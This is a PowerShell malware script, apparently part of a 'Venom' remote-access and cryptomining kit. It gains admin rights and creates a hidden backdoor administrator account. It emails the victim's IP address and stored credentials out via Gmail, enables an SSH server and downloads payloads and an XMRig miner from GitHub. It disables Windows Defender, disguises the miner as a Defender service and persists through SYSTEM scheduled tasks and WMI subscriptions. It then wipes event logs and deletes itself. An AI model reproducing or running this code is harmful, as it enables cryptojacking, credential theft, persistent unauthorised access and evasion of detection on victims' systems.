function random_text {
    return -join ((97..122)+(65..90) | Get-Random -Count 5 | % {[char]$_})
}

if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process powershell -Verb runAs -ArgumentList $arguments
    Exit
} else {
    Set-Variable -Name username -Value ("...")
    Set-Variable -Name Password -Value (ConvertTo-SecureString ".V3n0m" -AsPlainText -Force)
    New-LocalUser $username -Description "Local admin account created via PowerShell" -FullName "..." -Password $Password
    Add-LocalGroupMember -Member $username -Group "Administrators"
}

Set-Variable -Name wd -Value (random_text)
Set-Variable -Value ("$env:temp\$wd") -Name path
Set-Variable -Name INITIALPATH -Value (Get-Location)
Set-Variable -Value "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Name initial_dir

Set-Variable -Value (Get-Content PkUbTvqXFIdB.txt) -Name email
Set-Variable -Name password -Value (Get-Content NzKnmxLrbsBw.txt)

$PublicIP = Invoke-RestMethod -Uri "https://api64.ipify.org"

Set-Variable -Name ipFile -Value ("$initial_dir\ip.txt")
$PublicIP | Out-File -FilePath $ipFile

Set-Variable -Name configfile -Value ("$env:UserName.rat")
Set-Content -Path $configfile -Value ""
Add-Content -Value $PublicIP -Path $configfile
Add-Content -Path $configfile -Value $password
Add-Content -Value $INITIALPATH -Path $configfile
Add-Content -Value $env:temp -Path $configfile

Set-Variable -Name SecurePassword -Value (ConvertTo-SecureString $password -AsPlainText -Force)
Set-Variable -Name plainPassword -Value ([Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecurePassword)))
Add-Content -Value $plainPassword -Path $configfile

Send-MailMessage `
    -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -Force -String $plainPassword -AsPlainText)) `
    -Port 587 `
    -From $email `
    -Subject "IP Address Notification from $env:UserName" `
    -UseSsl `
    -To $email `
    -SmtpServer "smtp.gmail.com" `
    -Attachment $configfile

Remove-Item -Path $configfile
mkdir $path
cd $path

Invoke-WebRequest -OutFile "QyjAaZDBbNPk.reg" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wrev.reg"
Invoke-WebRequest -OutFile "FoRAUwtxKkSB.vbs" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/calty.vbs"
Invoke-WebRequest -OutFile "w.bat" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/w.bat"
Invoke-WebRequest -OutFile "ZDaFvwjOosKx.vbs" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/RunHidden.vbs"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/w.bat" -OutFile "w.bat"

Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -StartupType 'Automatic' -Name sshd
Get-NetFirewallRule -Name *ssh*

& "./QyjAaZDBbNPk.reg"
& "./FoRAUwtxKkSB.vbs"

Move-Item -Path "$path\ZDaFvwjOosKx.vbs" -Destination $initial_dir

Start-Sleep -Seconds 30
New-Item -ItemType Directory -Name "$wd" -Path "$path"
cd $wd
Set-Variable -Name currentDir -Value ($Pwd)

Invoke-WebRequest -OutFile "xmrig-6.22.2-msvc-win64.zip" -Uri "https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/xmrig-6.22.2-msvc-win64.zip"

Set-ItemProperty -Value "Hidden" -Path "$initial_dir\xmrig-6.22.2" -Name Attributes

Set-Variable -Name newConfigPath -Value ("$path\w.bat")
Set-Variable -Value ("$initial_dir\xmrig-6.22.2\w.bat") -Name targetConfigPath
if (Test-Path -Path $newConfigPath) {
    Copy-Item -Path $newConfigPath -Destination $targetConfigPath -Force
    Write-Output "bat file has been copied successfully."
} else {
    Write-Output "New bat file not found at the specified path."
}

Remove-Item -Path "$initial_dir\ip.txt"

Set-Location -Path 'C:\Users'
if (Test-Path -Path '...' -PathType Container) {
    attrib +h +s +r ...
    Write-Output "... directory attributes set to hidden, system, and read-only"
} else {
    Write-Output "... directory does not exist"
    Exit 1
}


cd $path
Remove-Item -Path "QyjAaZDBbNPk.reg"
Remove-Item -Path "FoRAUwtxKkSB.vbs"

Set-ItemProperty -Path "$initial_dir\ZDaFvwjOosKx.vbs" -Name Attributes -Value "Hidden"

cd $initial_dir
Start-Process -FilePath "cscript.exe" -windowstyle hidden -ArgumentList "ZDaFvwjOosKx.vbs"

#Start-Process -windowstyle hidden -ArgumentList "$initial_dir\xmrig-6.22.2\w.bat" -FilePath "cscript.exe"

Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
#cd "$initial_dir\xmrig-6.22.2"
#Start-Process -FilePath ".\w.bat" -NoNewWindow -Wait
#Start-Process -FilePath ".\xmrig.exe" -ArgumentList "--config=config.json" -NoNewWindow -Wait

#Start-Process -FilePath "$initial_dir\xmrig-6.22.2\xmrig.exe" -windowstyle hidden 
#& "./TMqhONoBljEv.vbs"

#Requires -RunAsAdministrator
#$env:SystemRoo
# Define hidden payload path
$hiddenDir = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
#$payloadName = "svchost.exe"
$destinationPath = "$hiddenDir\xmrig-6.22.2\xmrig.exe"#Join-Path $hiddenDir $payloadName
#$newConfigPath_2 = "$initial_dir\xmrig-6.22.2"
Expand-Archive -Path "$currentDir\xmrig-6.22.2-msvc-win64.zip" -DestinationPath $hiddenDir

# Create hidden directory
if (-not (Test-Path $hiddenDir)) {
    New-Item -Path $hiddenDir -ItemType Directory -Force | Out-Null
    attrib.exe +s +h $hiddenDir
}

# Copy miner to hidden location
#Copy-Item -Path $newConfigPath_2 -Destination $destinationPath -Force
Set-Variable -Name newConfigPath -Value ("$path\w.bat")
Set-Variable -Value ("$hiddenDir\xmrig-6.22.2\w.bat") -Name targetConfigPath
if (Test-Path -Path $newConfigPath) {
    Copy-Item -Path $newConfigPath -Destination $targetConfigPath -Force
    Write-Output "bat file has been copied successfully."
} else {
    Write-Output "New bat file not found at the specified path."
}

# Disable Windows Defender temporarily
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath $hiddenDir -ErrorAction SilentlyContinue

# 1. Create Windows Service with auto-restart
$serviceName = "WinDefendSvc_$((Get-Date).Ticks)"
try {
    New-Service -Name $serviceName `
        -BinaryPathName "`"$destinationPath`" --donate-level=1" `
        -DisplayName "Windows Defender Security Service" `
        -StartupType Automatic `
        -Description "Provides system security services" | Out-Null
    
    # Configure service recovery
    sc.exe failure $serviceName reset= 0 actions= restart/5000/restart/5000/restart/5000 | Out-Null
    Start-Service -Name $serviceName -ErrorAction Stop
}
catch {
    Write-Warning "Service creation failed: $($_.Exception.Message)"
}

# 2. Create SYSTEM-level Scheduled Task
$taskName = "WinDefendTask_$((Get-Date).Ticks)"
try {
    $action = New-ScheduledTaskAction -Execute $destinationPath -Argument "--donate-level=1"
    $trigger1 = New-ScheduledTaskTrigger -AtStartup
    $trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5) -RepetitionInterval (New-TimeSpan -Minutes 60)
    
    $settings = New-ScheduledTaskSettingsSet `
        -Hidden `
        -DontStopIfGoingOnBatteries `
        -StartWhenAvailable `
        -MultipleInstances Ignore

    Register-ScheduledTask -TaskName $taskName `
        -Action $action `
        -Trigger $trigger1, $trigger2 `
        -Settings $settings `
        -User "NT AUTHORITY\SYSTEM" `
        -RunLevel Highest `
        -Force | Out-Null
}
catch {
    Write-Warning "Scheduled task creation failed: $($_.Exception.Message)"
}

# 3. WMI Event Subscription
try {
    $wmiQuery = @"
    SELECT * FROM __InstanceModificationEvent WITHIN 60 
    WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' 
    AND TargetInstance.SystemUpTime >= 300
"@

    $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
        Name = "SysHealth_$((Get-Date).Ticks)"
        EventNamespace = 'root\cimv2'
        Query = $wmiQuery
        QueryLanguage = 'WQL'
    }

    $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
        Name = "SysMaint_$((Get-Date).Ticks)"
        CommandLineTemplate = "`"$destinationPath`" --donate-level=1"
        RunInteractively = $false
    }

    $binding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
        Filter = $filter.__PATH
        Consumer = $consumer.__PATH
    }
}
catch {
    Write-Warning "WMI persistence failed: $($_.Exception.Message)"
}

# 4. Immediate Execution (Hidden)
if (-not (Get-Process -Name (Get-Item $destinationPath).BaseName -ErrorAction SilentlyContinue)) {
    Start-Process $destinationPath -ArgumentList "--donate-level=1" -WindowStyle Hidden
}

# 5. Anti-Forensic Measures
# Clear current logs
wevtutil.exe cl "Microsoft-Windows-PowerShell/Operational" /q 2>$null
wevtutil.exe cl "System" /q 2>$null

# Create scheduled log cleaner
$logCleanupScript = {
    wevtutil.exe cl "Security" /q 2>$null
    wevtutil.exe cl "Application" /q 2>$null
    wevtutil.exe cl "Microsoft-Windows-WMI-Activity/Operational" /q 2>$null
}

$logCleanupScript | Out-File "$hiddenDir\logclean.ps1" -Force
Register-ScheduledTask -TaskName "LogMaintenance_$((Get-Date).Ticks)" `
    -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$hiddenDir\logclean.ps1`" -WindowStyle Hidden") `
    -Trigger (New-ScheduledTaskTrigger -Daily -At 3AM) `
    -Settings (New-ScheduledTaskSettingsSet -Hidden) `
    -User "NT AUTHORITY\SYSTEM" `
    -Force | Out-Null

# 6. Self-Destruct
$selfDestructCommand = @"
Start-Sleep 15
Remove-Item -Path "$PSCommandPath" -Force -ErrorAction SilentlyContinue
"@

$selfDestructCommand | Out-File "$env:TEMP\cleanup.ps1" -Force
Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$env:TEMP\cleanup.ps1`"" -WindowStyle Hidden

#Start-Process -FilePath "$path\AEQKCPrkuifY.ps1" -windowstyle hidden
Start-Sleep -Seconds 360

Remove-Item -Path "$initial_dir\ip.txt"
Remove-Item -Path "$initial_dir\NzKnmxLrbsBw.txt"
Remove-Item -Path "$initial_dir\PkUbTvqXFIdB.txt"
Remove-Item -Path "$initial_dir\BVrAihDwJNvc.ps1"
Remove-Item -Path "$initial_dir\TMqhONoBljEv.vbs"
Remove-Item -Path "$path\w.bat"
